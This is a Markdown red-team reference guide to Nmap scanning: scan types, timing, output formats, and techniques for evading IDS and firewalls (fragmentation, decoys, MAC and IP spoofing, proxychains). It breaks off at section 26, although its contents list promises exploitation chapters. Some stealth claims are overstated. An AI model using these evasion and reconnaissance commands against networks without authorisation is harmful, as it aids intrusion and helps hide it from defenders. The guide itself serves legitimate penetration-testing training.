# 🔍 NMAP — Complete Red Team Reference Guide

> **Audience:** Penetration Testers / Red Team Specialists  
> **Purpose:** Reconnaissance, enumeration, exploitation-prep, and IDS evasion  
> **Tool:** Nmap (Network Mapper) — <https://nmap.org>

---

## Table of Contents

1. [What is Nmap?](#1-what-is-nmap)
2. [What is a Port Scan?](#2-what-is-a-port-scan)
3. [Port Scanning Techniques](#3-port-scanning-techniques)
4. [7 Layers of the OSI Model](#4-7-layers-of-the-osi-model)
5. [Analyzing the Network Layer Using Wireshark](#5-analyzing-the-network-layer-using-wireshark)
6. [Scanning TCP and UDP Ports](#6-scanning-tcp-and-udp-ports)
7. [TCP Headers](#7-tcp-headers)
8. [Complete 3-Way Handshake](#8-complete-3-way-handshake)
9. [Network Discovery](#9-network-discovery)
10. [Nmap SYN, ACK, UDP, ARP Scan (Bypass Firewall)](#10-nmap-syn-ack-udp-arp-scan-bypass-firewall)
11. [Nmap ICMP, Timestamp, Traceroute, DNS Resolution](#11-nmap-icmp-timestamp-traceroute-dns-resolution)
12. [Nmap — Scanning Linux Based Machines](#12-nmap--scanning-linux-based-machines)
13. [Nmap — Port Specification and Scan Order](#13-nmap--port-specification-and-scan-order)
14. [Nmap — Scan Techniques (-sS, -sT, -sA, -sW, -sM)](#14-nmap--scan-techniques--ss--st--sa--sw--sm)
15. [Nmap — OS and Service Detection, Aggressive Scan, UDP Range Scan, Results Diagnosis](#15-nmap--os-and-service-detection-aggressive-scan-udp-range-scan-results-diagnosis)
16. [Nmap — Output and Verbosity](#16-nmap--output-and-verbosity)
17. [Nmap IDS Evasion — Null Scan](#17-nmap-ids-evasion--null-scan)
18. [Nmap IDS Evasion — Packet Fragmentation](#18-nmap-ids-evasion--packet-fragmentation)
19. [Nmap IDS Evasion — FIN Scan](#19-nmap-ids-evasion--fin-scan)
20. [Nmap IDS Evasion — XMAS Scan](#20-nmap-ids-evasion--xmas-scan)
21. [Nmap IDS Evasion — IP Spoofing (Decoy)](#21-nmap-ids-evasion--ip-spoofing-decoy)
22. [Nmap IDS Evasion — How to Detect Firewall](#22-nmap-ids-evasion--how-to-detect-firewall)
23. [Nmap IDS Evasion — MAC Spoofing, IP Spoofing, Proxies](#23-nmap-ids-evasion--mac-spoofing-ip-spoofing-proxies)
24. [Nmap Timing Templates (T0–T5)](#24-nmap-timing-templates-t0t5)
25. [Nmap Scan Delay and Host Timeout](#25-nmap-scan-delay-and-host-timeout)
26. [Nmap Script Scanning (NSE)](#26-nmap-script-scanning-nse)
27. [Nmap Banner Grabbing](#27-nmap-banner-grabbing)
28. [Nmap — WHOIS Lookup](#28-nmap--whois-lookup)
29. [Nmap — Subdomain Bruteforce](#29-nmap--subdomain-bruteforce)
30. [Nmap — Finding Hidden Directories](#30-nmap--finding-hidden-directories)
31. [Nmap — How to Detect Web Firewalls](#31-nmap--how-to-detect-web-firewalls)
32. [Nmap — MySQL Enumeration](#32-nmap--mysql-enumeration)
33. [Vulnerability Scanning Using Nmap](#33-vulnerability-scanning-using-nmap)
34. [Installing Webmap](#34-installing-webmap)
35. [Nmap Scanning and Generating a Report](#35-nmap-scanning-and-generating-a-report)
36. [FTP Enumeration and Exploitation](#36-ftp-enumeration-and-exploitation)
37. [SSH Enumeration and Exploitation (Msfconsole & Hydra)](#37-ssh-enumeration-and-exploitation-msfconsole--hydra)
38. [Telnet Enumeration and Exploitation](#38-telnet-enumeration-and-exploitation)
39. [SMTP Enumeration and Exploitation](#39-smtp-enumeration-and-exploitation)
40. [Port 80 Enumeration and Exploitation](#40-port-80-enumeration-and-exploitation)
41. [NetBIOS Enumeration and Exploitation](#41-netbios-enumeration-and-exploitation)
42. [Rexec Enumeration and Exploitation](#42-rexec-enumeration-and-exploitation)
43. [JavaRMI Enumeration and Exploitation](#43-javarmi-enumeration-and-exploitation)
44. [MySQL Enumeration and Exploitation](#44-mysql-enumeration-and-exploitation)
45. [PostgreSQL Enumeration and Exploitation](#45-postgresql-enumeration-and-exploitation)
46. [VNC Enumeration and Exploitation](#46-vnc-enumeration-and-exploitation)
47. [X11 Enumeration and Exploitation](#47-x11-enumeration-and-exploitation)
48. [Apache Tomcat Enumeration and Exploitation](#48-apache-tomcat-enumeration-and-exploitation)
49. [Exploiting Ruby DRb Vulnerability](#49-exploiting-ruby-drb-vulnerability)

---

## 1. What is Nmap?

**Nmap** (Network Mapper) is a free, open-source command-line tool designed for:

- **Network discovery** — find live hosts, devices, and services on a network
- **Port scanning** — identify open, closed, or filtered ports
- **Service/version detection** — determine what software and version runs on each port
- **OS fingerprinting** — guess the operating system of a target
- **Vulnerability detection** — via NSE (Nmap Scripting Engine) scripts

It is the #1 tool used in reconnaissance by both defenders and red teamers.

```bash
# Check nmap version
nmap --version

# Basic syntax
nmap [scan_type] [options] {target}

# Example: Simple scan of a single host
nmap 192.168.1.1

# Example: Scan a subnet
nmap 192.168.1.0/24
```

> **Red Team Use:** Nmap is your first step in every engagement. It maps the attack surface — what's alive, what ports are open, and what services are exposed.

---

## 2. What is a Port Scan?

A **port scan** is a technique used to probe a target host/network for **open ports** and **available services**.

- A **port** is a logical endpoint for communication. Ports range from **0 to 65535**.
  - **0–1023**: Well-known ports (HTTP=80, HTTPS=443, SSH=22, FTP=21)
  - **1024–49151**: Registered ports
  - **49152–65535**: Dynamic/ephemeral ports

### Port States (as Nmap sees them)

| State | Meaning |
|-------|---------|
| `open` | A service is actively listening on this port |
| `closed` | Port is reachable but no service is listening |
| `filtered` | Firewall/filter is blocking probes — Nmap cannot determine state |
| `unfiltered` | Port is reachable but state is unknown (seen in ACK scans) |
| `open\|filtered` | Nmap cannot tell if open or filtered |
| `closed\|filtered` | Nmap cannot tell if closed or filtered |

---

## 3. Port Scanning Techniques

### 3.1 Ping Scan (Host Discovery)

Sends ICMP echo requests to determine if hosts are **alive** before doing a full port scan.

```bash
# Ping scan — only discover live hosts, don't port scan
nmap -sn 192.168.1.0/24

# Disable ping (scan even hosts that don't respond to ping)
nmap -Pn 192.168.1.1
```

> **How it works:** Sends ICMP Type 8 (Echo Request). If the target replies with ICMP Type 0 (Echo Reply), the host is alive.

---

### 3.2 Vanilla Scan (Full TCP Connect)

Attempts to complete a full TCP three-way handshake on all 65,535 ports.

```bash
nmap -sT 192.168.1.1
```

> **How it works:** Sends `SYN` → receives `SYN-ACK` → replies with `ACK`. Connection is fully established. Very **noisy** — logged by the target OS and any IDS.

---

### 3.3 SYN Scan (Half-Open / Stealth Scan)

Sends only a `SYN` flag. If the port is open it gets a `SYN-ACK` back, but Nmap responds with `RST` instead of completing the handshake. **No full connection is established**, so the session is **not logged** by many systems.

```bash
nmap -sS 192.168.1.1        # Requires root/sudo
sudo nmap -sS 192.168.1.1
```

> **Why it matters for red teams:** This is the default and most popular scan. It's faster and stealthier than a full connect scan.

```
Nmap           Target
  |---SYN------->|   (Are you open?)
  |<--SYN-ACK----|   (Yes, I'm open)
  |---RST-------->|   (Nmap aborts — no log created)
```

---

### 3.4 XMAS Scan

Sets three TCP flags simultaneously: **FIN**, **PSH**, and **URG** — creating an "illogical" packet (like a Christmas tree all lit up).

```bash
sudo nmap -sX 192.168.1.1
```

> **Logic:** These flags together do not appear in normal TCP traffic, so they trick older or poorly configured firewalls/IDS.

**Port response behavior:**

- **Open port** → Target OS **ignores** the packet (no reply)
- **Closed port** → Target OS responds with `RST`

**Limitation:** Does NOT work reliably on **Windows** systems because Windows does not follow RFC 793 regarding these edge-case flag combinations — Windows simply responds with `RST` regardless of port state.

---

### 3.5 FIN Scan

Sends a single **FIN** flag — an unexpected packet because FIN is normally used to close an established connection.

```bash
sudo nmap -sF 192.168.1.1
```

**Port response behavior:**

- **Open port** → Target OS **ignores** the packet (no reply)
- **Closed port** → Target OS responds with `RST`

> **Red Team Use:** Useful to bypass packet filters that block SYN packets (since FIN doesn't trigger connection tracking).

**Same limitation as XMAS:** Fails on Windows OS.

---

### 3.6 NULL Scan

Sends a TCP packet with **no flags set** at all — the most minimal, unexpected packet possible.

```bash
sudo nmap -sN 192.168.1.1
```

**Port response behavior:**

- **Open port** → No response (filtered or open)
- **Closed port** → RST/ACK

---

### 3.7 FTP Bounce Scan

Exploits a legacy feature in FTP servers (PORT command) to **proxy port scans through an FTP server**, masking the true scanner's IP.

```bash
nmap -b username:password@ftp-server.target.com 192.168.1.1
```

> **How it works:** You connect to a vulnerable FTP server and instruct it to send data to arbitrary hosts/ports. The FTP server performs the scan on your behalf. Modern FTP servers have patched this, but legacy systems may still be vulnerable.

---

## 4. 7 Layers of the OSI Model

The **OSI (Open Systems Interconnection)** model is the framework that describes how data travels across a network. Understanding it is critical for interpreting Nmap results.

| Layer | Name | Protocol Examples | Nmap Relevance |
|-------|------|-------------------|----------------|
| 7 | Application | HTTP, FTP, SSH, DNS, SMTP | Banner grabbing, NSE scripts |
| 6 | Presentation | SSL/TLS, JPEG, MPEG | TLS fingerprinting |
| 5 | Session | NetBIOS, RPC, PPTP | Session enumeration |
| 4 | Transport | TCP, UDP | Port scanning lives here |
| 3 | Network | IP, ICMP, ARP | Ping scan, traceroute, OS detection |
| 2 | Data Link | Ethernet, MAC, 802.11 | ARP scan, MAC spoofing |
| 1 | Physical | Cables, Radio waves | Not directly relevant |

> **Red Team Note:** Nmap primarily operates at **Layers 3 and 4**, but NSE scripts can reach up to **Layer 7** for deep application enumeration.

---

## 5. Analyzing the Network Layer Using Wireshark

**Wireshark** is a packet capture tool used to visually inspect the raw packets Nmap sends and receives. This helps you:

- Understand exactly what scan packets look like at the wire level
- Verify that your IDS evasion techniques are working
- Analyze target responses

### Capturing Nmap Traffic in Wireshark

```bash
# Run Wireshark to capture on eth0, filter for TCP
wireshark &

# Then run your nmap scan in another terminal
sudo nmap -sS 192.168.1.1
```

### Useful Wireshark Filters

```
# Show only TCP SYN packets (first step of handshake)
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Show XMAS scan packets (FIN+PSH+URG all set)
tcp.flags.fin == 1 && tcp.flags.push == 1 && tcp.flags.urg == 1

# Show RST packets (closed port responses)
tcp.flags.reset == 1

# Filter by source IP
ip.src == 192.168.1.100

# Filter by destination port
tcp.dstport == 80
```

> **In Wireshark**, an XMAS scan packet looks like a Christmas tree in the flags column — FIN, PSH, and URG all lit up simultaneously. This is where the name comes from.

---

## 6. Scanning TCP and UDP Ports

### TCP Scanning

TCP is **connection-oriented** — it requires a handshake. This makes port state determination reliable.

```bash
# SYN scan (default, recommended)
sudo nmap -sS 192.168.1.1

# Full connect scan (no root required)
nmap -sT 192.168.1.1

# Scan specific TCP port
nmap -p 80 192.168.1.1

# Scan top 1000 ports (default behavior)
nmap 192.168.1.1

# Scan ALL 65535 TCP ports
sudo nmap -sS -p- 192.168.1.1
```

### UDP Scanning

UDP is **connectionless** — there is no handshake. This makes UDP scanning **slower and less reliable**.

```bash
# UDP scan
sudo nmap -sU 192.168.1.1

# Combine TCP and UDP
sudo nmap -sS -sU 192.168.1.1

# UDP scan with specific ports
sudo nmap -sU -p 53,67,68,69,123,161,162 192.168.1.1
```

**Common UDP services to always check:**

| Port | Service |
|------|---------|
| 53 | DNS |
| 67/68 | DHCP |
| 69 | TFTP |
| 123 | NTP |
| 161/162 | SNMP |
| 500 | IKE/VPN |

> **Red Team Note:** UDP ports are often overlooked by defenders and contain misconfigured services (SNMP with `public` community strings, etc.).

---

## 7. TCP Headers

Understanding TCP headers helps you craft custom packets and interpret Nmap output.

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |           |U|A|P|R|S|F|                               |
| Offset| Reserved  |R|C|S|S|Y|I|            Window             |
|       |           |G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### TCP Flag Reference

| Flag | Abbr | Bit | Purpose |
|------|------|-----|---------|
| URG  | Urgent | 32 | Urgent data present |
| ACK  | Acknowledge | 16 | Acknowledges received data |
| PSH  | Push | 8 | Push buffered data to application |
| RST  | Reset | 4 | Abort/reset the connection |
| SYN  | Synchronize | 2 | Initiate a connection |
| FIN  | Finish | 1 | Gracefully close a connection |

---

## 8. Complete 3-Way Handshake

The TCP **3-way handshake** establishes a connection before data is transferred.

```
Client                          Server
  |                               |
  |---------- SYN (seq=x) ------->|   Step 1: Client wants to connect
  |                               |
  |<----- SYN-ACK (seq=y,ack=x+1)-|   Step 2: Server acknowledges & syncs
  |                               |
  |---------- ACK (ack=y+1) ----->|   Step 3: Client acknowledges
  |                               |
  |====== DATA TRANSFER ===========|   Connection established
```

### How Different Nmap Scans Interact with the Handshake

| Scan Type | SYN sent | SYN-ACK received | ACK sent | Full Connection? |
|-----------|----------|-----------------|----------|-----------------|
| `-sT` (Connect) | ✅ | ✅ | ✅ | ✅ Yes — logged |
| `-sS` (SYN) | ✅ | ✅ | ❌ (RST sent) | ❌ No — stealthy |
| `-sF` (FIN) | ❌ | N/A | ❌ | ❌ No handshake |
| `-sN` (NULL) | ❌ | N/A | ❌ | ❌ No handshake |
| `-sX` (XMAS) | ❌ | N/A | ❌ | ❌ No handshake |

---

## 9. Network Discovery

Before port scanning, you need to identify **which hosts are alive**.

```bash
# Ping sweep — discover all live hosts in a subnet
nmap -sn 192.168.1.0/24

# ARP scan (most reliable on local network)
sudo nmap -PR 192.168.1.0/24

# Disable DNS resolution for speed
nmap -sn -n 192.168.1.0/24

# Aggressive host discovery
nmap -sn -PE -PA80,443 -PS22,80,443 192.168.1.0/24

# Scan a range of IPs
nmap 192.168.1.1-254

# Scan from a target list file
nmap -iL targets.txt

# Exclude specific hosts
nmap 192.168.1.0/24 --exclude 192.168.1.1,192.168.1.2
```

---

## 10. Nmap SYN, ACK, UDP, ARP Scan (Bypass Firewall)

### SYN Scan (`-sS`)

```bash
sudo nmap -sS 192.168.1.1
```

Most useful scan. Half-open, fast, and stealthy (see section 3.3).

---

### ACK Scan (`-sA`)

Does NOT determine if a port is open. Instead, it maps **firewall rules**.

```bash
sudo nmap -sA 192.168.1.1
```

- **unfiltered** → port is reachable (firewall allows the ACK through)
- **filtered** → firewall is dropping or blocking ACK packets

> **Red Team Use:** Use `-sA` to figure out which ports a firewall is watching. If a port is `unfiltered` by ACK but `filtered` by SYN, you know a stateful firewall is present.

---

### UDP Scan (`-sU`)

```bash
sudo nmap -sU --top-ports 100 192.168.1.1
```

---

### ARP Scan (`-PR`)

On a **local network**, ARP is more reliable than ICMP for host discovery (ICMP is often blocked, ARP cannot be).

```bash
sudo nmap -PR 192.168.1.0/24
```

---

### Combining Scans to Bypass Firewalls

```bash
# SYN + UDP combined
sudo nmap -sS -sU -p T:80,443,22,21,25, U:53,161 192.168.1.1

# Use decoys + SYN scan to confuse firewall logs
sudo nmap -sS -D RND:10 192.168.1.1
```

---

## 11. Nmap ICMP, Timestamp, Traceroute, DNS Resolution

### ICMP Echo (`-PE`)

```bash
sudo nmap -PE 192.168.1.0/24
```

### ICMP Timestamp (`-PP`)

Sends ICMP Timestamp requests. Some hosts respond to this even when they block echo requests.

```bash
sudo nmap -PP 192.168.1.0/24
```

### ICMP Address Mask (`-PM`)

```bash
sudo nmap -PM 192.168.1.0/24
```

### Traceroute

Maps the network path to the target.

```bash
nmap --traceroute 192.168.1.1
nmap -sn --traceroute 192.168.1.0/24
```

### DNS Resolution

```bash
# Force reverse DNS resolution
nmap -R 192.168.1.0/24

# Disable DNS resolution (faster scans)
nmap -n 192.168.1.1

# Use custom DNS server
nmap --dns-servers 8.8.8.8 192.168.1.1
```

---

## 12. Nmap — Scanning Linux Based Machines

Linux machines often expose common services. Here's how to enumerate them thoroughly.

```bash
# Quick scan
sudo nmap -sS -T4 192.168.1.50

# Full service and version detection
sudo nmap -sV -sC -O 192.168.1.50

# All ports + aggressive
sudo nmap -A -p- 192.168.1.50

# Top 20 ports quick check
sudo nmap --top-ports 20 192.168.1.50

# Full aggressive scan with output to file
sudo nmap -A -p- -T4 192.168.1.50 -oA linux_scan_results
```

**Common Linux ports to focus on:**

| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP | Check for anonymous login |
| 22 | SSH | Brute force target |
| 23 | Telnet | Cleartext credentials |
| 25 | SMTP | Open relay check |
| 80/443 | HTTP/HTTPS | Web exploits |
| 111 | RPCbind | NFS enum |
| 139/445 | Samba | EternalBlue on old versions |
| 2049 | NFS | Mount without auth |
| 3306 | MySQL | Remote DB access |
| 6000 | X11 | Remote desktop access |

---

## 13. Nmap — Port Specification and Scan Order

### Specific Ports

```bash
# Scan a single port
nmap -p 22 192.168.1.1

# Scan multiple ports
nmap -p 22,80,443,3306 192.168.1.1

# Scan a port range
nmap -p 1-1024 192.168.1.1

# Scan all 65535 ports
nmap -p- 192.168.1.1
nmap -p 0-65535 192.168.1.1

# Scan only TCP ports
nmap -p T:80,443 192.168.1.1

# Scan only UDP ports
nmap -p U:53,161 192.168.1.1

# Top N most common ports
nmap --top-ports 100 192.168.1.1
nmap --top-ports 1000 192.168.1.1

# Exclude certain ports from the scan
nmap --exclude-ports 80,443 192.168.1.1
```

### Scan Order

By default, Nmap randomizes port order to avoid detection patterns.

```bash
# Scan ports in sequential order (not random)
nmap -r 192.168.1.1
```

---

## 14. Nmap — Scan Techniques (-sS, -sT, -sA, -sW, -sM)

### Full Comparison

| Flag | Name | Description | Requires Root |
|------|------|-------------|--------------|
| `-sS` | SYN / Stealth | Half-open, doesn't complete handshake | ✅ |
| `-sT` | TCP Connect | Full 3-way handshake | ❌ |
| `-sA` | ACK | Maps firewall rules, not open ports | ✅ |
| `-sW` | Window | Like ACK but analyzes TCP window field | ✅ |
| `-sM` | Maimon | FIN + ACK — evades some firewalls | ✅ |
| `-sN` | NULL | No flags set | ✅ |
| `-sF` | FIN | Only FIN flag | ✅ |
| `-sX` | XMAS | FIN + PSH + URG | ✅ |
| `-sU` | UDP | UDP port scanning | ✅ |
| `-sI` | Idle/Zombie | Use a zombie host to scan | ✅ |

### Window Scan (`-sW`)

Similar to ACK scan but inspects the TCP window size in RST replies. Some OS implementations reveal port state through window size.

```bash
sudo nmap -sW 192.168.1.1
```

### Maimon Scan (`-sM`)

Sends FIN + ACK probe. Named after Uriel Maimon who discovered it.

```bash
sudo nmap -sM 192.168.1.1
```

### Idle / Zombie Scan (`-sI`)

The most **covert** technique. Nmap uses a third-party "zombie" host to perform the scan. Your IP never directly contacts the target.

```bash
# First find a suitable zombie (needs predictable IP ID sequence)
sudo nmap -O --script ipidseq 192.168.1.50

# Then use it as the zombie
sudo nmap -sI 192.168.1.50 192.168.1.1
```

> **Red Team Use:** Your real IP never appears in the target's logs — only the zombie host's IP does.

---

## 15. Nmap — OS and Service Detection, Aggressive Scan, UDP Range Scan, Results Diagnosis

### OS Detection (`-O`)

Nmap sends a series of probes and analyzes responses to fingerprint the operating system.

```bash
sudo nmap -O 192.168.1.1

# More aggressive OS detection
sudo nmap -O --osscan-guess 192.168.1.1
```

### Service / Version Detection (`-sV`)

Determines the exact name and version of services running on open ports.

```bash
nmap -sV 192.168.1.1

# More aggressive version detection (slower but more accurate)
nmap -sV --version-intensity 9 192.168.1.1

# Light version detection (faster)
nmap -sV --version-intensity 0 192.168.1.1
```

### Aggressive Scan (`-A`)

Enables: OS detection + version detection + script scanning + traceroute.

```bash
sudo nmap -A 192.168.1.1

# Aggressive on all ports
sudo nmap -A -p- 192.168.1.1
```

### UDP Range Scan

```bash
# Scan UDP ports 1-1000
sudo nmap -sU -p 1-1000 192.168.1.1

# Scan specific critical UDP ports
sudo nmap -sU -p 53,67,69,111,123,161,162,500,514,1900 192.168.1.1
```

### Results Diagnosis

After scanning, here's how to interpret the output:

```
PORT     STATE    SERVICE   VERSION
22/tcp   open     ssh       OpenSSH 7.4 (protocol 2.0)
80/tcp   open     http      Apache httpd 2.4.6
443/tcp  filtered https
3306/tcp closed   mysql
```

- `open` → Attack surface — enumerate this service further
- `filtered` → Firewall in place — try evasion techniques
- `closed` → Not running — low priority but note it
- `open|filtered` → UDP or firewall ambiguity — probe further

---

## 16. Nmap — Output and Verbosity

### Verbosity

```bash
# Verbose output
nmap -v 192.168.1.1

# Very verbose (shows each open port as found)
nmap -vv 192.168.1.1

# Extra verbose
nmap -vvv 192.168.1.1
```

### Output Formats

```bash
# Normal output to file
nmap -oN output.txt 192.168.1.1

# XML output (for import into tools like Metasploit)
nmap -oX output.xml 192.168.1.1

# Grepable output (for bash parsing)
nmap -oG output.gnmap 192.168.1.1

# All formats at once
nmap -oA scan_results 192.168.1.1
# Creates: scan_results.nmap, scan_results.xml, scan_results.gnmap

# Script kiddie output (stylized ASCII)
nmap -oS skiddie.txt 192.168.1.1
```

### Parsing Grepable Output

```bash
# Extract open ports from grepable output
grep "open" output.gnmap | awk '{print $2}' | sort -u

# Find all hosts with port 80 open
grep "80/open" output.gnmap
```

---

## 17. Nmap IDS Evasion — Null Scan

A **Null scan** sends a TCP packet with **zero flags**. This is abnormal behavior, as all legitimate TCP packets have at least one flag set.

```bash
sudo nmap -sN 192.168.1.1
sudo nmap -sN -p 80,443,22 192.168.1.1
```

**How it evades IDS:**

- Many older IDS/firewall systems only inspect SYN packets or track connection state
- A packet with no flags doesn't trigger SYN-based rules
- Stateless firewalls pass it through because it doesn't match "new connection" signatures

**Response behavior (Linux/Unix):**

- **Open or filtered port** → No response
- **Closed port** → RST + ACK

> **Limitation:** Works on Linux/Unix. Windows ignores RFC 793 and responds with RST to all such probes regardless of port state.

---

## 18. Nmap IDS Evasion — Packet Fragmentation

Splits TCP/IP packets into smaller fragments. Many older IDS reassemble fragments incorrectly or not at all, allowing the scan to slip through.

```bash
# Fragment packets into 8-byte chunks
sudo nmap -f 192.168.1.1

# Double fragmentation (16-byte chunks)
sudo nmap -ff 192.168.1.1

# Custom fragment size (must be multiple of 8)
sudo nmap --mtu 16 192.168.1.1
sudo nmap --mtu 24 192.168.1.1

# Combine with SYN scan
sudo nmap -sS -f 192.168.1.1
```

> **How it works:** When you fragment packets, the IDS receives incomplete TCP headers split across multiple IP fragments. Older or simple IDS engines may not reassemble them before applying rules, so the scan slides past undetected.

> **Note:** Modern Next-Gen firewalls (NGFW) and IDS systems do reassemble fragments before inspection. Use this against older, legacy systems.

---

## 19. Nmap IDS Evasion — FIN Scan

Sends packets with only the **FIN flag** set. This is unexpected because FIN is normally used to terminate an existing, established connection.

```bash
sudo nmap -sF 192.168.1.1

# FIN scan with version detection
sudo nmap -sF -sV 192.168.1.1

# Scan specific ports with FIN
sudo nmap -sF -p 1-1024 192.168.1.1
```

**Why it evades IDS:**

- Stateless ACLs and older firewalls that only block SYN packets won't block FIN packets
- There's no SYN to trigger "new connection" IDS signatures

**Response logic (per RFC 793):**

- Closed port → RST
- Open port → No response (packet ignored)

**Works on:** Linux, Unix, most non-Windows systems  
**Fails on:** Windows (sends RST regardless)

---

## 20. Nmap IDS Evasion — XMAS Scan

Sets **FIN + PSH + URG** simultaneously — like a Christmas tree with all lights on.

```bash
sudo nmap -sX 192.168.1.1

# XMAS scan on top 1000 ports
sudo nmap -sX --top-ports 1000 192.168.1.1

# XMAS with slow timing to avoid detection
sudo nmap -sX -T1 192.168.1.1
```

**Logic of the attack:**

- Sending FIN (close this connection), PSH (send data immediately), and URG (this is urgent) simultaneously makes no logical sense
- The combination can confuse packet analyzers and some IDS rules
- Firewalls that don't deeply inspect flags may pass these packets as they don't look like new connections

**Response logic:**

- Open port → No response
- Closed port → RST

**Wireshark appearance:** In Wireshark's TCP flags column, you'll see FIN, PSH, and URG all highlighted — visually resembling a lit Christmas tree.

**Fails on:** Windows OS (RST regardless)

---

## 21. Nmap IDS Evasion — IP Spoofing (Decoy)

Makes your scan appear to come from **multiple IP addresses** simultaneously, hiding your real IP among the noise.

```bash
# Use random decoys (RND:N = N random IPs)
sudo nmap -D RND:10 192.168.1.1

# Use specific decoy IPs
sudo nmap -D 10.0.0.1,10.0.0.2,10.0.0.3,ME 192.168.1.1
# ME = inserts your real IP among decoys

# Use decoys with SYN scan
sudo nmap -sS -D RND:5 192.168.1.1
```

> **How it works:** Nmap sends scan probes from your real IP but also spoofs packets with multiple other IPs. The target's firewall logs show many "attacking" IPs. Analysts cannot easily determine which one is real.

> **Red Team Use:** Excellent for confusing blue team incident response — they won't know which IP to block or investigate.

> **Limitation:** The spoofed decoy IPs must be reachable/alive on the network, otherwise decoy packets may be filtered by upstream routers.

---

## 22. Nmap IDS Evasion — How to Detect Firewall

Determining what kind of firewall/filtering is in place helps you choose the right evasion technique.

### Method 1: Compare SYN vs ACK Scan Results

```bash
# SYN scan to see open/filtered ports
sudo nmap -sS 192.168.1.1

# ACK scan to see what firewall allows
sudo nmap -sA 192.168.1.1
```

**Interpretation:**

- Port `filtered` in SYN, `unfiltered` in ACK → **Stateless firewall** (blocks SYN but allows ACK)
- Port `filtered` in both → **Stateful firewall** (inspects full connection state)
- Port `open` in SYN, `unfiltered` in ACK → Port is genuinely open

### Method 2: Use the Firewall Detection Script

```bash
sudo nmap --script firewall-bypass 192.168.1.1
sudo nmap -sA --script firewalk 192.168.1.1
```

### Method 3: TTL and Window Size Analysis

```bash
sudo nmap -sS --reason 192.168.1.1
```

The `--reason` flag shows why Nmap assigned each port state, revealing firewall behavior.

### Method 4: Traceroute Inspection

```bash
sudo nmap --traceroute 192.168.1.1
```

Look for where the TTL stops or where you see `* * *` — that's likely where a firewall is dropping packets.

---

## 23. Nmap IDS Evasion — MAC Spoofing, IP Spoofing, Proxies

### MAC Address Spoofing

Changes your MAC address so the target only sees a fabricated hardware address. Useful on local network (Layer 2) engagements.

```bash
# Spoof a random MAC
sudo nmap --spoof-mac 0 192.168.1.1

# Spoof a specific MAC
sudo nmap --spoof-mac 00:11:22:33:44:55 192.168.1.1

# Spoof MAC from a specific vendor (e.g., Apple)
sudo nmap --spoof-mac Apple 192.168.1.1
sudo nmap --spoof-mac Cisco 192.168.1.1
sudo nmap --spoof-mac Dell 192.168.1.1
```

> **Use Case:** If MAC-based access control is in place (e.g., only Cisco devices are allowed), spoofing a Cisco MAC might bypass it.

---

### IP Spoofing (Source IP)

```bash
# Spoof your source IP entirely
sudo nmap -S 10.0.0.5 -e eth0 192.168.1.1
```

> **Warning:** Full IP spoofing means you won't receive the responses (they go to the spoofed IP). Only useful for crafting blind attacks or when you control the spoofed IP.

---

### Proxies and Proxychains

Route your Nmap scan through a chain of proxy servers to hide your origin.

```bash
# Install proxychains
apt install proxychains

# Edit /etc/proxychains.conf and add your proxies
# Then route nmap through proxychains (TCP only)
proxychains nmap -sT -Pn 192.168.1.1
```

> **Note:** Only `-sT` (full connect) works through proxychains. SYN scan requires raw socket access and cannot be proxied this way.

---

## 24. Nmap Timing Templates (T0–T5)

Nmap has six timing templates that control the **speed and stealth** of your scan.

| Template | Name | Description | Use Case |
|----------|------|-------------|----------|
| `-T0` | Paranoid | 5 min delay between probes | Maximum IDS evasion |
| `-T1` | Sneaky | 15 sec delay | IDS evasion |
| `-T2` | Polite | 0.4 sec delay | Avoid bandwidth issues |
| `-T3` | Normal | Default | Standard scans |
| `-T4` | Aggressive | Reduced timeouts, parallel probes | Fast internal scans |
| `-T5` | Insane | Minimum timeouts, max parallelism | Very fast but noisy |

```bash
# Paranoid — slowest, most stealthy
sudo nmap -T0 192.168.1.1

# Sneaky — still slow, bypasses most IDS
sudo nmap -T1 192.168.1.1

# Normal default
nmap -T3 192.168.1.1

# Aggressive — good for internal networks
sudo nmap -T4 192.168.1.1

# Insane — maximum speed, very detectable
sudo nmap -T5 192.168.1.1
```

> **Red Team Rule:** Use **T1 or T2** for external engagements. Use **T4** for internal networks once you're inside and time is limited. Never use T5 when stealth matters.

---

## 25. Nmap Scan Delay and Host Timeout

Fine-grained control over timing for stealth and performance.

```bash
# Wait 1 second between each probe
sudo nmap --scan-delay 1s 192.168.1.1

# Wait 500 milliseconds between probes
sudo nmap --scan-delay 500ms 192.168.1.1

# Maximum time to wait for a response per probe
sudo nmap --host-timeout 30s 192.168.1.1

# Min/max RTT timeout
sudo nmap --min-rtt-timeout 100ms --max-rtt-timeout 3000ms 192.168.1.1

# Control parallelism
sudo nmap --min-parallelism 10 --max-parallelism 100 192.168.1.1

# Max retries per port
sudo nmap --max-retries 2 192.168.1.1
```

---

## 26. Nmap Script Scanning (NSE)

**NSE (Nmap Scripting Engine)** is one of the most powerful features of Nmap. Scripts are written in Lua and can automate tasks ranging from service discovery to exploitation.

### Script Categories

| Category | Purpose |
|----------|---------|
| `auth` | Test authentication/credentials |
| `broadcast` | Network broadcast discovery |
| `brute` | Brute-force login attacks |
| `default` | Safe, useful scripts (run with `-sC`) |
| `discovery` | Service enumeration |
| `dos` | Denial-of-service testing |
| `exploit` | Active exploitation |
| `external` | Uses external resources (WHOIS, etc.) |
| `fuzzer` | Sends random data |
| `intrusive` | May crash or affect targets |
| `malware` | Detect backdoors and malware |
